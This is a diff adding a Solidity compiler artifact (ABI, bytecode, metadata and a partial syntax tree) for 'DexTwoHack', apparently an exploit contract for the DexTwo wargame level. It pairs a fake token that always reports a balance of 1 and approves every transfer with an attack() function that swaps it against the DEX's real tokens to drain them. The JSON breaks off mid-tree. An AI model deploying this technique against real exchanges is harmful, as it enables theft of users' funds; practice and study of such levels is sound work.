@@ -1,0 +1,1200 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract DexTwo",
+          "name": "_dexTwo",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "balance",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "from",
+          "type": "address"
+        },
+        {
+          "internalType": "address",
+          "name": "to",
+          "type": "address"
+        },
+        {
+          "internalType": "uint256",
+          "name": "amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "transferFrom",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "bytecode": {
+    "object": "0x608060405234801561001057600080fd5b506040516103bf3803806103bf83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61032c806100936000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806323b872dd1461004657806370a08231146100725780639e5faafc14610094575b600080fd5b61005d610054366004610274565b60019392505050565b60405190151581526020015b60405180910390f35b6100866100803660046102b5565b50600190565b604051908152602001610069565b61009c61009e565b005b6000546040805163d21220a760e01b815290516001600160a01b039092169163df791e50913091849163d21220a79160048083019260209291908290030181865afa1580156100f1573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011591906102d9565b6040516001600160e01b031960e085901b1681526001600160a01b0392831660048201529116602482015260016044820152606401600060405180830381600087803b15801561016457600080fd5b505af1158015610178573d6000803e3d6000fd5b5050600054604080516312df092760e11b815290516001600160a01b03909216935063df791e509250309184916325be124e9160048083019260209291908290030181865afa1580156101cf573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101f391906102d9565b6040516001600160e01b031960e085901b1681526001600160a01b0392831660048201529116602482015260016044820152606401600060405180830381600087803b15801561024257600080fd5b505af1158015610256573d6000803e3d6000fd5b50505050565b6001600160a01b038116811461027157600080fd5b50565b60008060006060848603121561028957600080fd5b83356102948161025c565b925060208401356102a48161025c565b929592945050506040919091013590565b6000602082840312156102c757600080fd5b81356102d28161025c565b9392505050565b6000602082840312156102eb57600080fd5b81516102d28161025c56fea2646970667358221220d710aed3d7a11716646695fc42f13ff08b5327343d262945b9ecd017579f99fc64736f6c63430008110033",
+    "sourceMap": "82:471:23:-:0;;;127:61;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;165:6;:16;;-1:-1:-1;;;;;;165:16:23;-1:-1:-1;;;;;165:16:23;;;;;;;;;;82:471;;14:305:100;99:6;152:2;140:9;131:7;127:23;123:32;120:52;;;168:1;165;158:12;120:52;194:16;;-1:-1:-1;;;;;239:31:100;;229:42;;219:70;;285:1;282;275:12;219:70;308:5;14:305;-1:-1:-1;;;14:305:100:o;:::-;82:471:23;;;;;;",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x608060405234801561001057600080fd5b50600436106100415760003560e01c806323b872dd1461004657806370a08231146100725780639e5faafc14610094575b600080fd5b61005d610054366004610274565b60019392505050565b60405190151581526020015b60405180910390f35b6100866100803660046102b5565b50600190565b604051908152602001610069565b61009c61009e565b005b6000546040805163d21220a760e01b815290516001600160a01b039092169163df791e50913091849163d21220a79160048083019260209291908290030181865afa1580156100f1573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011591906102d9565b6040516001600160e01b031960e085901b1681526001600160a01b0392831660048201529116602482015260016044820152606401600060405180830381600087803b15801561016457600080fd5b505af1158015610178573d6000803e3d6000fd5b5050600054604080516312df092760e11b815290516001600160a01b03909216935063df791e509250309184916325be124e9160048083019260209291908290030181865afa1580156101cf573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101f391906102d9565b6040516001600160e01b031960e085901b1681526001600160a01b0392831660048201529116602482015260016044820152606401600060405180830381600087803b15801561024257600080fd5b505af1158015610256573d6000803e3d6000fd5b50505050565b6001600160a01b038116811461027157600080fd5b50565b60008060006060848603121561028957600080fd5b83356102948161025c565b925060208401356102a48161025c565b929592945050506040919091013590565b6000602082840312156102c757600080fd5b81356102d28161025c565b9392505050565b6000602082840312156102eb57600080fd5b81516102d28161025c56fea2646970667358221220d710aed3d7a11716646695fc42f13ff08b5327343d262945b9ecd017579f99fc64736f6c63430008110033",
+    "sourceMap": "82:471:23:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;289:110;;;;;;:::i;:::-;388:4;289:110;;;;;;;;;776:14:100;;769:22;751:41;;739:2;724:18;289:110:23;;;;;;;;194:89;;;;;;:::i;:::-;-1:-1:-1;275:1:23;;194:89;;;;1201:25:100;;;1189:2;1174:18;194:89:23;1055:177:100;405:146:23;;;:::i;:::-;;;442:6;;469:15;;;-1:-1:-1;;;469:15:23;;;;-1:-1:-1;;;;;442:6:23;;;;:11;;462:4;;442:6;;469:13;;:15;;;;;;;;;;;;;;442:6;469:15;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;442:46;;-1:-1:-1;;;;;;442:46:23;;;;;;;-1:-1:-1;;;;;1759:15:100;;;442:46:23;;;1741:34:100;1811:15;;1791:18;;;1784:43;486:1:23;1843:18:100;;;1836:34;1676:18;;442:46:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;498:6:23;;525:15;;;-1:-1:-1;;;525:15:23;;;;-1:-1:-1;;;;;498:6:23;;;;-1:-1:-1;498:11:23;;-1:-1:-1;518:4:23;;498:6;;525:13;;:15;;;;;;;;;;;;;;498:6;525:15;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;498:46;;-1:-1:-1;;;;;;498:46:23;;;;;;;-1:-1:-1;;;;;1759:15:100;;;498:46:23;;;1741:34:100;1811:15;;1791:18;;;1784:43;542:1:23;1843:18:100;;;1836:34;1676:18;;498:46:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;405:146::o;14:131:100:-;-1:-1:-1;;;;;89:31:100;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:456::-;227:6;235;243;296:2;284:9;275:7;271:23;267:32;264:52;;;312:1;309;302:12;264:52;351:9;338:23;370:31;395:5;370:31;:::i;:::-;420:5;-1:-1:-1;477:2:100;462:18;;449:32;490:33;449:32;490:33;:::i;:::-;150:456;;542:7;;-1:-1:-1;;;596:2:100;581:18;;;;568:32;;150:456::o;803:247::-;862:6;915:2;903:9;894:7;890:23;886:32;883:52;;;931:1;928;921:12;883:52;970:9;957:23;989:31;1014:5;989:31;:::i;:::-;1039:5;803:247;-1:-1:-1;;;803:247:100:o;1237:251::-;1307:6;1360:2;1348:9;1339:7;1335:23;1331:32;1328:52;;;1376:1;1373;1366:12;1328:52;1408:9;1402:16;1427:31;1452:5;1427:31;:::i",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "attack()": "9e5faafc",
+    "balanceOf(address)": "70a08231",
+    "transferFrom(address,address,uint256)": "23b872dd"
+  },
+  "rawMetadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract DexTwo\",\"name\":\"_dexTwo\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/DexTwo/DexTwoHack.sol\":\"DexTwoHack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ds-test/=lib/ds-test/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d\",\"dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"lib/openzeppelin-contracts/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]},\"lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol\":{\"keccak256\":\"0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://864a40efcffdf408044c332a5aa38ec5618ed7b4eecb8f65faf45671bd6cdc65\",\"dweb:/ipfs/QmQJquTMtc6fgm5JQzGdsGpA2fqBe3MHWEdt2qzaLySMdN\"]},\"src/DexTwo/DexTwo.sol\":{\"keccak256\":\"0xc7ad61039aabd74ba1f4960b01a44cefc522c0ed7de4b955df5d83617f9255a2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7d3c9d534604c6c1a000fdb11278c84e322499613eeac1482121991e2f9d7aa4\",\"dweb:/ipfs/QmNcAcrg9spqPx2XVqk3KZwkXNBPTZLNiFfQ2TJ3M2rsj7\"]},\"src/DexTwo/DexTwoHack.sol\":{\"keccak256\":\"0x82ebf34b7bcd7060d7c70d85c58493233dd97410b7930fb3a4f7b11b5fe7b8df\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://26c661357e0e42920bae242319005d840e189a73536f7dd7eb6c0279f0b549f2\",\"dweb:/ipfs/QmekMSNvphqtpoayRwEsU9xSeQQDfdWzJsBhgsmTyCxhKp\"]}},\"version\":1}",
+  "metadata": {
+    "compiler": {
+      "version": "0.8.17+commit.8df45f5f"
+    },
+    "language": "Solidity",
+    "output": {
+      "abi": [
+        {
+          "inputs": [
+            {
+              "internalType": "contract DexTwo",
+              "name": "_dexTwo",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "constructor"
+        },
+        {
+          "inputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "attack"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function",
+          "name": "balanceOf",
+          "outputs": [
+            {
+              "internalType": "uint256",
+              "name": "balance",
+              "type": "uint256"
+            }
+          ]
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "from",
+              "type": "address"
+            },
+            {
+              "internalType": "address",
+              "name": "to",
+              "type": "address"
+            },
+            {
+              "internalType": "uint256",
+              "name": "amount",
+              "type": "uint256"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "transferFrom",
+          "outputs": [
+            {
+              "internalType": "bool",
+              "name": "",
+              "type": "bool"
+            }
+          ]
+        }
+      ],
+      "devdoc": {
+        "kind": "dev",
+        "methods": {},
+        "version": 1
+      },
+      "userdoc": {
+        "kind": "user",
+        "methods": {},
+        "version": 1
+      }
+    },
+    "settings": {
+      "remappings": [
+        ":ds-test/=lib/ds-test/src/",
+        ":openzeppelin-contracts/=lib/openzeppelin-contracts/"
+      ],
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "metadata": {
+        "bytecodeHash": "ipfs"
+      },
+      "compilationTarget": {
+        "src/DexTwo/DexTwoHack.sol": "DexTwoHack"
+      },
+      "libraries": {}
+    },
+    "sources": {
+      "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol": {
+        "keccak256": "0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d",
+        "urls": [
+          "bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d",
+          "dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol": {
+        "keccak256": "0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b",
+        "urls": [
+          "bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34",
+          "dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
+        "keccak256": "0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca",
+        "urls": [
+          "bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd",
+          "dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Context.sol": {
+        "keccak256": "0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7",
+        "urls": [
+          "bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92",
+          "dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol": {
+        "keccak256": "0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e",
+        "urls": [
+          "bzz-raw://864a40efcffdf408044c332a5aa38ec5618ed7b4eecb8f65faf45671bd6cdc65",
+          "dweb:/ipfs/QmQJquTMtc6fgm5JQzGdsGpA2fqBe3MHWEdt2qzaLySMdN"
+        ],
+        "license": "MIT"
+      },
+      "src/DexTwo/DexTwo.sol": {
+        "keccak256": "0xc7ad61039aabd74ba1f4960b01a44cefc522c0ed7de4b955df5d83617f9255a2",
+        "urls": [
+          "bzz-raw://7d3c9d534604c6c1a000fdb11278c84e322499613eeac1482121991e2f9d7aa4",
+          "dweb:/ipfs/QmNcAcrg9spqPx2XVqk3KZwkXNBPTZLNiFfQ2TJ3M2rsj7"
+        ],
+        "license": "MIT"
+      },
+      "src/DexTwo/DexTwoHack.sol": {
+        "keccak256": "0x82ebf34b7bcd7060d7c70d85c58493233dd97410b7930fb3a4f7b11b5fe7b8df",
+        "urls": [
+          "bzz-raw://26c661357e0e42920bae242319005d840e189a73536f7dd7eb6c0279f0b549f2",
+          "dweb:/ipfs/QmekMSNvphqtpoayRwEsU9xSeQQDfdWzJsBhgsmTyCxhKp"
+        ],
+        "license": "MIT"
+      }
+    },
+    "version": 1
+  },
+  "ast": {
+    "absolutePath": "src/DexTwo/DexTwoHack.sol",
+    "id": 4990,
+    "exportedSymbols": {
+      "Context": [
+        3004
+      ],
+      "DexTwo": [
+        4725
+      ],
+      "DexTwoHack": [
+        4989
+      ],
+      "ERC20": [
+        2549
+      ],
+      "IERC20": [
+        2627
+      ],
+      "IERC20Metadata": [
+        2652
+      ],
+      "SafeMath": [
+        3316
+      ],
+      "SwappableTokenTwo": [
+        4748
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "33:521:23",
+    "nodes": [
+      {
+        "id": 4917,
+        "nodeType": "PragmaDirective",
+        "src": "33:24:23",
+        "nodes": [],
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".10"
+        ]
+      },
+      {
+        "id": 4918,
+        "nodeType": "ImportDirective",
+        "src": "58:22:23",
+        "nodes": [],
+        "absolutePath": "src/DexTwo/DexTwo.sol",
+        "file": "./DexTwo.sol",
+        "nameLocation": "-1:-1:-1",
+        "scope": 4990,
+        "sourceUnit": 4749,
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "id": 4989,
+        "nodeType": "ContractDefinition",
+        "src": "82:471:23",
+        "nodes": [
+          {
+            "id": 4921,
+            "nodeType": "VariableDeclaration",
+            "src": "108:13:23",
+            "nodes": [],
+            "constant": false,
+            "mutability": "mutable",
+            "name": "dexTwo",
+            "nameLocation": "115:6:23",
+            "scope": 4989,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_DexTwo_$4725",
+              "typeString": "contract DexTwo"
+            },
+            "typeName": {
+              "id": 4920,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 4919,
+                "name": "DexTwo",
+                "nameLocations": [
+                  "108:6:23"
+                ],
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 4725,
+                "src": "108:6:23"
+              },
+              "referencedDeclaration": 4725,
+              "src": "108:6:23",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_DexTwo_$4725",
+                "typeString": "contract DexTwo"
+              }
+            },
+            "visibility": "internal"
+          },
+          {
+            "id": 4932,
+            "nodeType": "FunctionDefinition",
+            "src": "127:61:23",
+            "nodes": [],
+            "body": {
+              "id": 4931,
+              "nodeType": "Block",
+              "src": "155:33:23",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "id": 4929,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 4927,
+                      "name": "dexTwo",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 4921,
+                      "src": "165:6:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_DexTwo_$4725",
+                        "typeString": "contract DexTwo"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 4928,
+                      "name": "_dexTwo",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 4924,
+                      "src": "174:7:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_DexTwo_$4725",
+                        "typeString": "contract DexTwo"
+                      }
+                    },
+                    "src": "165:16:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_DexTwo_$4725",
+                      "typeString": "contract DexTwo"
+                    }
+                  },
+                  "id": 4930,
+                  "nodeType": "ExpressionStatement",
+                  "src": "165:16:23"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 4925,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 4924,
+                  "mutability": "mutable",
+                  "name": "_dexTwo",
+                  "nameLocation": "146:7:23",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4932,
+                  "src": "139:14:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_contract$_DexTwo_$4725",
+                    "typeString": "contract DexTwo"
+                  },
+                  "typeName": {
+                    "id": 4923,
+                    "nodeType": "UserDefinedTypeName",
+                    "pathNode": {
+                      "id": 4922,
+                      "name": "DexTwo",
+                      "nameLocations": [
+                        "139:6:23"
+                      ],
+                      "nodeType": "IdentifierPath",
+                      "referencedDeclaration": 4725,
+                      "src": "139:6:23"
+                    },
+                    "referencedDeclaration": 4725,
+                    "src": "139:6:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_DexTwo_$4725",
+                      "typeString": "contract DexTwo"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "138:16:23"
+            },
+            "returnParameters": {
+              "id": 4926,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "155:0:23"
+            },
+            "scope": 4989,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 4944,
+            "nodeType": "FunctionDefinition",
+            "src": "194:89:23",
+            "nodes": [],
+            "body": {
+              "id": 4943,
+              "nodeType": "Block",
+              "src": "255:28:23",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "id": 4941,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 4939,
+                      "name": "balance",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 4937,
+                      "src": "265:7:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "hexValue": "31",
+                      "id": 4940,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": true,
+                      "kind": "number",
+                      "lValueRequested": false,
+                      "nodeType": "Literal",
+                      "src": "275:1:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_rational_1_by_1",
+                        "typeString": "int_const 1"
+                      },
+                      "value": "1"
+                    },
+                    "src": "265:11:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "id": 4942,
+                  "nodeType": "ExpressionStatement",
+                  "src": "265:11:23"
+                }
+              ]
+            },
+            "functionSelector": "70a08231",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "balanceOf",
+            "nameLocation": "203:9:23",
+            "parameters": {
+              "id": 4935,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 4934,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4944,
+                  "src": "213:7:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 4933,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "213:7:23",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "212:9:23"
+            },
+            "returnParameters": {
+              "id": 4938,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 4937,
+                  "mutability": "mutable",
+                  "name": "balance",
+                  "nameLocation": "247:7:23",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4944,
+                  "src": "242:12:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 4936,
+                    "name": "uint",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "242:4:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "241:14:23"
+            },
+            "scope": 4989,
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 4958,
+            "nodeType": "FunctionDefinition",
+            "src": "289:110:23",
+            "nodes": [],
+            "body": {
+              "id": 4957,
+              "nodeType": "Block",
+              "src": "371:28:23",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "hexValue": "74727565",
+                    "id": 4955,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": true,
+                    "kind": "bool",
+                    "lValueRequested": false,
+                    "nodeType": "Literal",
+                    "src": "388:4:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    },
+                    "value": "true"
+                  },
+                  "functionReturnParameters": 4954,
+                  "id": 4956,
+                  "nodeType": "Return",
+                  "src": "381:11:23"
+                }
+              ]
+            },
+            "functionSelector": "23b872dd",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "transferFrom",
+            "nameLocation": "298:12:23",
+            "parameters": {
+              "id": 4951,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 4946,
+                  "mutability": "mutable",
+                  "name": "from",
+                  "nameLocation": "319:4:23",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4958,
+                  "src": "311:12:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 4945,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "311:7:23",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 4948,
+                  "mutability": "mutable",
+                  "name": "to",
+                  "nameLocation": "333:2:23",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4958,
+                  "src": "325:10:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 4947,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "325:7:23",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 4950,
+                  "mutability": "mutable",
+                  "name": "amount",
+                  "nameLocation": "342:6:23",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4958,
+                  "src": "337:11:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 4949,
+                    "name": "uint",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "337:4:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "310:39:23"
+            },
+            "returnParameters": {
+              "id": 4954,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 4953,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 4958,
+                  "src": "365:4:23",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_bool",
+                    "typeString": "bool"
+                  },
+                  "typeName": {
+                    "id": 4952,
+                    "name": "bool",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "365:4:23",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "364:6:23"
+            },
+            "scope": 4989,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 4988,
+            "nodeType": "FunctionDefinition",
+            "src": "405:146:23",
+            "nodes": [],
+            "body": {
+              "id": 4987,
